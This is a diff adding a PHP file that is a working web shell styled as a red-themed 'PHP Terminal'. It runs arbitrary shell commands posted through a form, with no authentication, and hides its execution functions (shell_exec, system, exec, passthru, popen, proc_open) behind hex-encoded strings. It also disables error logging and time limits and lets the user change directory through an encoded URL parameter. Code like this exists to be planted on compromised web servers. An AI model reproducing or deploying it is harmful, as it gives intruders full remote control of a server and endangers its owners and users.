@@ -1,0 +1,209 @@
+<?php
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+if (function_exists('session_destroy')) @session_destroy();
+@ini_set('session.use_cookies', 0);
+@ini_set('session.use_only_cookies', 0);
+@ini_set('session.use_trans_sid', 0);
+@ini_set('session.auto_start', 0);
+@ini_set('output_buffering', 0);
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PHP Terminal</title>
+  <link rel="shortcut icon" href="https://raw.githubusercontent.com/MadExploits/php-terminal/main/logo.png" type="image/x-icon">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700">
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      background: black;
+      font-family: 'Source Code Pro', monospace;
+      color: #ff0000;
+    }
+
+    .bg {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      background-size: cover;
+      opacity: 0.2;
+      z-index: -1;
+      filter: grayscale(60%);
+    }
+
+    .terminal {
+      width: 90%;
+      margin: 10vh auto;
+      background-color: rgba(0, 0, 0, 0.8);
+      border: 2px solid #ff0000;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #ff0000;
+    }
+
+    .window-title {
+      padding: 5px;
+      background: #1a1a1a;
+      color: #ff0000;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top-left-radius: 10px;
+      border-top-right-radius: 10px;
+    }
+
+    .win-buttons a {
+      width: 10px;
+      height: 10px;
+      display: inline-block;
+      border-radius: 50%;
+      margin-right: 5px;
+    }
+
+    #close { background: #e25544; }
+    #min { background: #f5b640; }
+    #max { background: #7cb058; }
+
+    .message {
+      padding: 15px;
+      font-size: 14px;
+      min-height: 200px;
+      color: #cccccc;
+    }
+
+    .prompt {
+      font-weight: bold;
+    }
+
+    form {
+      display: flex;
+      padding: 10px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      background: black;
+      color: #ff0000;
+      border: none;
+      border-top: 1px solid #ff0000;
+      padding: 8px;
+      font-family: 'Source Code Pro', monospace;
+      outline: none;
+    }
+
+    .footer {
+      background-color: #1a1a1a;
+      color: #cccccc;
+      padding: 10px;
+      border-bottom-left-radius: 10px;
+      border-bottom-right-radius: 10px;
+    }
+
+    .typed-cursor {
+      color: #ff0000;
+    }
+
+    ::selection {
+      background: #ff0000;
+      color: black;
+    }
+  </style>
+</head>
+<body>
+<div class="bg"></div>
+
+<?php
+$Array = [
+    '7368656c6c5f65786563','65786563','7061737374687275','73797374656d',
+    '70726f635f6f70656e','706f70656e','70636c6f7365','72657475726e',
+    '73747265616d5f6765745f636f6e74656e7473','676574637764','6368646972',
+    '7068705f756e616d65','6973736574','66756e6374696f6e5f657869737473',
+    '5f6d61645f636d64','245f5345525645525b275345525645525f4e414d45275d'
+];
+foreach ($Array as $hex) $fungsi[] = unhex($hex);
+
+if (isset($_GET['cd'])) {
+    $pathDirectory = unhex($_GET['cd']);
+    chdir($pathDirectory);
+} else {
+    $pathDirectory = $fungsi[9]();
+}
+
+function _mad_cmd($de) {
+    $out = '';
+    try {
+        if (function_exists('shell_exec')) return @$GLOBALS['fungsi'][0]($de);
+        else if (function_exists('system')) @$GLOBALS['fungsi'][3]($de);
+        else if (function_exists('exec')) {
+            $exec = [];
+            @$GLOBALS['fungsi'][1]($de, $exec);
+            return @join("\n", $exec);
+        } else if (function_exists('passthru')) @$GLOBALS['fungsi'][2]($de);
+        else if (function_exists('popen') && function_exists('pclose')) {
+            if (is_resource($f = @$GLOBALS['fungsi'][5]($de, "r"))) {
+                while (!@feof($f)) $out .= fread($f, 1024);
+                $GLOBALS['fungsi'][6]($f);
+                return $out;
+            }
+        } else if (function_exists('proc_open')) {
+            $pipes = [];
+            $process = @$GLOBALS['fungsi'][4]($de . ' 2>&1', [["pipe", "w"], ["pipe", "w"], ["pipe", "w"]], $pipes);
+            return @$GLOBALS['fungsi'][8]($pipes[1]);
+        }
+    } catch (Exception $e) {}
+    return $out;
+}
+
+function hex($n){ $y='';for($i=0;$i<strlen($n);$i++) $y.=dechex(ord($n[$i]));return $y; }
+function unhex($y){ $n='';for($i=0;$i<strlen($y)-1;$i+=2)$n.=chr(hexdec($y[$i].$y[$i+1]));return $n; }
+?>
+
+<div class="terminal">
+  <div class="window-title">
+    <div class="win-buttons">
+      <a id="close" class="button" href="#"></a>
+      <a id="min" class="button" href="#"></a>
+      <a id="max" class="button" href="#"></a>
+    </div>
+    <span>⛧ Terminal ⛧</span>
+  </div>
+  <div class="message">
+    <span class='prompt'>root@hakerff:~$</span>
+    <span class='typed'></span><br>
+    <pre>
+<?php
+if (isset($_POST['submit'])) {
+    $dataCMD = $_POST['value'];
+    $pecah = explode(" ", $dataCMD);
+    if ($pecah[0] == "cd" && isset($pecah[1])) {
+        echo '<meta http-equiv="refresh" content="0;url=?cd=' . hex($pecah[1]) . '">';
+    } else {
+        echo htmlspecialchars(_mad_cmd($dataCMD));
+    }
+}
+?>
+    </pre>
+  </div>
+  <form method="post">
+    <input type="text" name="value" placeholder="hakerff@<?= $_SERVER['SERVER_NAME']; ?>:~$" autofocus>
+    <input type="hidden" name="submit" value="true">
+  </form>
+  <div class="footer">
+    <b>Current Dir:</b> <?= htmlspecialchars($fungsi[9]()); ?>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/1.1.1/typed.min.js"></script>
+</script>
+</body>
+</html>
